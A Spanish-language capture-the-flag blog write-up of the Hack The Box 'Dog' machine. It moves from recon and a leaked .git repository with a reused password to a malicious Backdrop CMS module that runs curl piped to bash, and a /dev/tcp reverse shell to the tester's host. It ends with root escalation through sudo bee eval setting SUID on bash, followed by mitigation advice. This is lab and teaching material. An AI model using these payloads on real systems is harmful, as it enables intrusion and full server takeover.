---
layout: single
title: Hack the box - Dog
excerpt: Máquina fácil linux en la que se escala privilegios con un gestor de CMS
date: 2025-07-20
classes: wide
header:
  teaser: ../gits/sec/blog/assets/images/ic
  teaser_home_page: true
  icon: ../assets/images/hackthebox.webp
categories:
   - hack the box
   - linux 
tags:
   - ubuntu
   - backdrop-cms
   - bee
   - ctf 
---

Empezamos con la fase de reconocimiento: 

```bash 
┌──(kali㉿kali)-[~/labs-hack/dog]
└─$ ping -c 1 10.10.11.58
PING 10.10.11.58 (10.10.11.58) 56(84) bytes of data.
64 bytes from 10.10.11.58: icmp_seq=1 ttl=63 time=2066 ms

--- 10.10.11.58 ping statistics ---
1 packets transmitted, 1 received, 0% packet loss, time 0ms
rtt min/avg/max/mdev = 2065.964/2065.964/2065.964/0.000 ms
```
Màquina linux con ttl cercano a 64, pasamos al escaneo con nmap: 

```bash 
┌──(kali㉿kali)-[~/labs-hack/dog]
└─$ nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 10.10.11.58 
Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times may be slower.
Starting Nmap 7.95 ( https://nmap.org ) at 2025-07-17 22:53 EDT
Initiating SYN Stealth Scan at 22:53
Scanning 10.10.11.58 [65535 ports]
Discovered open port 80/tcp on 10.10.11.58
Discovered open port 22/tcp on 10.10.11.58
Completed SYN Stealth Scan at 22:53, 19.63s elapsed (65535 total ports)
Nmap scan report for 10.10.11.58
Host is up, received user-set (0.15s latency).
Scanned at 2025-07-17 22:53:38 EDT for 20s
Not shown: 55761 closed tcp ports (reset), 9772 filtered tcp ports (no-response)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT   STATE SERVICE REASON
22/tcp open  ssh     syn-ack ttl 63
80/tcp open  http    syn-ack ttl 63

Read data files from: /usr/share/nmap
Nmap done: 1 IP address (1 host up) scanned in 19.87 seconds
           Raw packets sent: 96241 (4.235MB) | Rcvd: 63227 (2.529MB)

┌──(kali㉿kali)-[~/labs-hack/dog]
└─$ nmap -p22,80 -sCV -vvv 10.10.11.58 -oN dog_analisys
Starting Nmap 7.95 ( https://nmap.org ) at 2025-07-17 22:57 EDT
PORT   STATE SERVICE REASON         VERSION
22/tcp open  ssh     syn-ack ttl 63 OpenSSH 8.2p1 Ubuntu 4ubuntu0.12 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 97:2a:d2:2c:89:8a:d3:ed:4d:ac:00:d2:1e:87:49:a7 (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDEJsqBRTZaxqvLcuvWuqOclXU1uxwUJv98W1TfLTgTYqIBzWAqQR7Y6fXBOUS6FQ9xctARWGM3w3AeDw+MW0j+iH83gc9J4mTFTBP8bXMgRqS2MtoeNgKWozPoy6wQjuRSUammW772o8rsU2lFPq3fJCoPgiC7dR4qmrWvgp5TV8GuExl7WugH6/cTGrjoqezALwRlKsDgmAl6TkAaWbCC1rQ244m58ymadXaAx5I5NuvCxbVtw32/eEuyqu+bnW8V2SdTTtLCNOe1Tq0XJz3mG9rw8oFH+Mqr142h81jKzyPO/YrbqZi2GvOGF+PNxMg+4kWLQ559we+7mLIT7ms0esal5O6GqIVPax0K21+GblcyRBCCNkawzQCObo5rdvtELh0CPRkBkbOPo4CfXwd/DxMnijXzhR/lCLlb2bqYUMDxkfeMnmk8HRF+hbVQefbRC/+vWf61o2l0IFEr1IJo3BDtJy5m2IcWCeFX3ufk5Fme8LTzAsk6G9hROXnBZg8=
|   256 27:7c:3c:eb:0f:26:e9:62:59:0f:0f:b1:38:c9:ae:2b (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBM/NEdzq1MMEw7EsZsxWuDa+kSb+OmiGvYnPofRWZOOMhFgsGIWfg8KS4KiEUB2IjTtRovlVVot709BrZnCvU8Y=
|   256 93:88:47:4c:69:af:72:16:09:4c:ba:77:1e:3b:3b:eb (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIPMpkoATGAIWQVbEl67rFecNZySrzt944Y/hWAyq4dPc
80/tcp open  http    syn-ack ttl 63 Apache httpd 2.4.41 ((Ubuntu))
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-favicon: Unknown favicon MD5: 3836E83A3E835A26D789DDA9E78C5510
| http-git: 
|   10.10.11.58:80/.git/
|     Git repository found!
|     Repository description: Unnamed repository; edit this file 'description' to name the...
|_    Last commit message: todo: customize url aliases.  reference:https://docs.backdro...
|_http-title: Home | Dog
|_http-server-header: Apache/2.4.41 (Ubuntu)
|_http-generator: Backdrop CMS 1 (https://backdropcms.org)
| http-robots.txt: 22 disallowed entries 
| /core/ /profiles/ /README.md /web.config /admin 
| /comment/reply /filter/tips /node/add /search /user/register 
| /user/password /user/login /user/logout /?q=admin /?q=comment/reply 
| /?q=filter/tips /?q=node/add /?q=search /?q=user/password 
|_/?q=user/register /?q=user/login /?q=user/logout
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

Bien, nos reporta un `.git`, asì que podeos usar `GitHack` para reconstruir el proyecto: 

```bash 
┌──(kali㉿kali)-[~/labs-hack/dog/GitHack/10.10.11.58]
└─$ ./GitHack.py http://10.10.11.58/.git/
```

Una vez terminado el escaneo, podemos explorar los directorios y ficheros, encontramos algo interesante en `settings.php`

```bash 
┌──(kali㉿kali)-[~/labs-hack/dog/GitHack/10.10.11.58]
└─$ head -n 20 settings.php                         
<?php
/**
 * @file
 * Main Backdrop CMS configuration file.
 */

/**
 * Database configuration:
 *
 * Most sites can configure their database by entering the connection string
 * below. If using primary/replica databases or multiple connections, see the
 * advanced database documentation at
 * https://api.backdropcms.org/database-configuration
 */
$database = 'mysql://root:BackDropJ2024DS2024@127.0.0.1/backdrop';
$database_prefix = '';
```

En el sitio nos encontramos con informaciòn sobre la salud alienticia de los perros: 

![](../assets/images/htb-dog/2.png)

> El sitio usa backdrop CMS, un gestor de contenido web enfocado a la simplicidad. 

Encontramos un forulario para iniciar sesión en `http://10.10.11.58/?q=user/login`. 
Buscando algùn usurio podemos ejecutar: 

```bash 
┌──(kali㉿kali)-[~/labs-hack/dog/GitHack/10.10.11.58]
└─$ grep -r "\.htb"   
files/config_83dddd18e1ec67fd8ff5bba2453c7fb3/active/update.settings.json:        "tiffany@dog.htb"
```

Y con las credenciales tifanny@dog.htb:BackDropJ2024DS2024 logramos acceder al panel. 

Dentro del panel vemos que podemos subir módulos: 

![](../assets/images/htb-dog/4.png)

Asì que podemos descargar algunos de [este sitio](https://backdropcms.org/project/examples). 

Descomprimimos y entrando a cualquier directorio de los mòdulos podemos editar el que tenga extensiòn `.module` para que tenga el siguiente contenido: 

```bash 
<?php
    system("curl 10.10.14.19 | bash"); 
?>
```

En algùn directori creamos un index.html con:

```bash 
#!/bin/bash 

bash -l >& /dev/tcp/10.10.14.19/443 0>&1
```

y poniendonos a la escucha con `nc -nlvp 443` ya podemos subir el mòdulo al sitio, buscarlo y activarlo ya deberìamos recibir la shell: 

![](../assets/images/htb-dog/5.png)

Estamos en la ruta `/var/www/html`, nos movemos a `/home` para intentar encontrar la flag: 

```bash 
bash-5.0$ find . 2>/dev/null
.
./johncusack
./johncusack/.bashrc
./johncusack/user.txt
./johncusack/.cache
./johncusack/.mysql_history
./johncusack/.bash_logout
./johncusack/.profile
./johncusack/.bash_history
./jobert
./jobert/.bashrc
./jobert/.cache
./jobert/.ssh
./jobert/.mysql_history
./jobert/.bash_logout
./jobert/.sudo_as_admin_successful
./jobert/.profile
./jobert/.bash_history
```

Para acceder a la flag podemos reutilizar la contraseña que encontramos con githack: 

```bash 
bash-5.0$ ls -l /home/johncusack/user.txt
-rw-r----- 1 root johncusack 33 Jul 17 10:02 /home/johncusack/user.txt
```

Listando ficheros que podemos ejecutar con root: 

```bash 
bash-5.0$ sudo -l 
[sudo] password for johncusack: 
Matching Defaults entries for johncusack on dog:
A
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User johncusack may run the following commands on dog:
    (ALL : ALL) /usr/local/bin/bee
A
bash-5.0$ ls -l /usr/local/bin/bee
lrwxrwxrwx 1 root root 26 Jul  9  2024 /usr/local/bin/bee -> /backdrop_tool/bee/bee.php
```
Bee es una herramienta de línea de comandos para Backdrop CMS, que es un fork ligero de Drupal. Bee funciona igual que Drush (en Drupal) o WP-CLI (en WordPress), pero para Backdrop.

- bee es el CLI oficial de Backdrop CMS, una plataforma CMS PHP.
- Sirve para gestionar configuraciones, actualizar módulos, limpiar caché, gestionar usuarios, etc., desde la terminal.

Explorando las configuraciones nos encontramos con lo siguiente, interesante y peligroso: 

![](../assets/images/htb-dog/7.png)

Por lo que podemos hacer lo siguiente: 

```bash 
bash-5.0$ sudo bee --root=/var/www/html eval "system('whoami')";
root
```

Con esto podrìamos ponerle el bit SETUID a nuestra bash y ejecutar comandos como root: 

```bash 
bash-5.0$ sudo bee --root=/var/www/html eval "system('chmod u+s /bin/bash')";
bash-5.0$ ls -al /bin/bash
-rwsr-xr-x 1 root root 1183448 Apr 18  2022 /bin/bash
bash-5.0$ bash -p
bash-5.0# ls -al /root/root.txt
-rw-r----- 1 root root 33 Jul 17 10:02 /root/root.txt
```

Para mitigar esto: 

1. **Eliminar o restringir el acceso a `bee` en sudoers**

   * Editar `/etc/sudoers` (siempre usando `visudo`) para que el usuario normal no pueda ejecutar la subcomando `eval`. En vez de permitir

     ```
     desarrollador ALL=(root) NOPASSWD: /usr/local/bin/bee  
     ```

     definir algo así:

     ```
     Cmnd_Alias BACKDROP_ONLY = /usr/local/bin/bee --root=/var/www/html cron, \
                                 /usr/local/bin/bee --root=/var/www/html cache-clear
     desarrollador ALL=(root) NOPASSWD: BACKDROP_ONLY
     ```

     De este modo solo podrá ejecutar tareas seguras (cron, limpieza de cache, copias de BD…) y **no** el subcomando `eval`. ([Hacking Dream][1])

2. **Actualizar o parchear la versión de Bee**
   La vulnerabilidad (CVE-2025-25062) ya fue corregida en versiones recientes de Backdrop CMS y de la herramienta Bee. Actualiza Bee a la última 1.x disponible, donde se ha endurecido el manejo de `eval` o directamente se ha eliminado el subcomando peligroso. ([Reid Hurlburt][2])

3. **Endurecer permisos del directorio de instalación**
   Se puede seguir la guía de “Stricter Permissions” de Backdrop para que sólo el administrador (p.ej. usuario `root` o un deploy user) escriba en el código, y el proceso web (www‑data) sólo escriba en `/sites/default/files`. Por ejemplo:

   ```bash
   cd /var/www/html/backdrop
   chown -R deploy:deploy .  
   chown -R www-data:www-data sites/default/files  
   find . -type f -exec chmod 644 {} \;  
   find . -type d -exec chmod 755 {} \;  
   ```

   Así, aunque alguien logre ejecutar PHP arbitrario, no podrá modificar binarios ni la propia toolchain de Bee. ([docs.backdropcms.org][3])

4. **Aplicar políticas de Mandatory Access Control (SELinux/AppArmor)**
   Configura un perfil que limite las llamadas de Bee (`/usr/local/bin/bee`) para que no pueda invocar funciones como `system()` o `chmod` sobre rutas fuera de `/var/www/html`. Incluso si se ejecuta como root, AppArmor puede prohibirle cambios en `/bin/bash`.

5. **Auditoría y monitoreo**

   * Registrar en `auditd` cualquier ejecución de `bee eval` (o llamada a `chmod` sobre `/bin/bash`).
   * Configurar alertas para comandos con UID 0 que modifiquen permisos de archivos sensibles.

